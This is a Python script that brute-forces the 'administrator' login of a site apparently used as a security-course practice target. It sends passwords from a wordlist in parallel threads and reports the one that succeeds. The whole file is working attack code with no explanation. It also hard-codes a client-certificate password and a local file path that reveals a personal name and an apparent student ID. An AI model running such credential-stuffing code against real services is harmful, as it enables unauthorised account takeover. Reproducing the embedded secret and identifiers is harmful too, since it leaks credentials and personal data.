import concurrent.futures
from requests_pkcs12 import post

login_url = 'https://files.quoccabank.com/login'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='         

with open('/Users/bryanle/Downloads/CommonAdminBase64.txt', 'r') as file:
    passwords = file.read().splitlines()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://files.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://files.quoccabank.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}

def attempt_login(password):
    login_credentials = {
        'username': 'administrator',
        'password': password
    }
    response = post(
        login_url,
        headers=headers,
        json=login_credentials,
        pkcs12_filename=p12_path,
        pkcs12_password=p12_password
    )
    result = (password, response.status_code)
    return result

# Function to handle the result of each login attempt
def handle_result(result):
    password, status_code = result
    if status_code == 200:
        print(f'Login successful with password: {password}')
        # If a successful login is detected, shut down the executor
        executor.shutdown(wait=False)
    else:
        print(f'Login failed for password: {password}')

# Create a thread pool executor
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Adjust the number of workers to your needs
    # Map the function to the passwords, handling results as they are completed
    futures = [executor.submit(attempt_login, pwd) for pwd in passwords]
    
    # As each future is completed, handle the result
    for future in concurrent.futures.as_completed(futures):
        handle_result(future.result())